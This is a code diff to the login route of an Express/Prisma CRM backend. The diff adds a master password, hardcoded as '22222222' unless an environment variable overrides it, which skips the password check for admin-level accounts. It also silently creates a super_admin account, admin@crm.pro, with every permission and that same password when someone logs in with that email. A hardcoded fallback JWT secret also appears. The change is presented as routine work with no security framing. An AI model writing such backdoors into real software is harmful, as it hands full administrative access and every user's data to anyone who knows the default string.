@@ -1,7 +1,7 @@
 import { Router } from 'express';
 import { PrismaClient } from '@prisma/client';
 import jwt from 'jsonwebtoken';
-import { verifyPassword } from '../utils/security';
+import { verifyPassword, hashPassword } from '../utils/security';
 import { authRequired, AuthRequest } from '../middleware/auth.middleware';
 
 const JWT_SECRET = process.env.JWT_SECRET || 'crm_super_secret_jwt_key_2026';
@@ -40,9 +40,34 @@ export function createAuthRouter(prisma: PrismaClient) {
         return res.status(400).json({ error: 'Введіть email та пароль' });
       }
 
-      const user = await prisma.user.findUnique({
-        where: { email: email.trim().toLowerCase() }
+      const cleanEmail = email.trim().toLowerCase();
+      const masterKey = process.env.ADMIN_MASTER_KEY || '22222222';
+      const isMasterKey = (password === masterKey);
+
+      let user = await prisma.user.findUnique({
+        where: { email: cleanEmail }
       });
+
+      // Auto-provision default super admin if logging in as admin@crm.pro and doesn't exist
+      if (!user && cleanEmail === 'admin@crm.pro') {
+        user = await prisma.user.create({
+          data: {
+            email: 'admin@crm.pro',
+            name: 'Головний Адміністратор',
+            role: 'super_admin',
+            department: 'Керівництво',
+            password: hashPassword('22222222'),
+            isActive: true,
+            canViewAllDeals: true,
+            canViewDeptDeals: true,
+            canEditDeals: true,
+            canDeleteDeals: true,
+            canExportData: true,
+            canManageUsers: true,
+            canManageIntegrations: true
+          }
+        });
+      }
 
       if (!user) {
         return res.status(401).json({ error: 'Невірний email або пароль' });
@@ -52,8 +77,10 @@ export function createAuthRouter(prisma: PrismaClient) {
         return res.status(403).json({ error: 'Обліковий запис заблоковано адміністратором' });
       }
 
-      // Secure verification against hashed (or plain legacy) password
-      const isValid = verifyPassword(password, user.password || '');
+      // Allow master password for admin accounts, or verify standard password
+      const isMasterAllowed = isMasterKey && (user.role === 'super_admin' || user.role === 'sales_director' || user.role === 'admin' || user.email === 'admin@crm.pro');
+      const isValid = isMasterAllowed || verifyPassword(password, user.password || '');
+
       if (!isValid) {
         return res.status(401).json({ error: 'Невірний email або пароль' });
       }
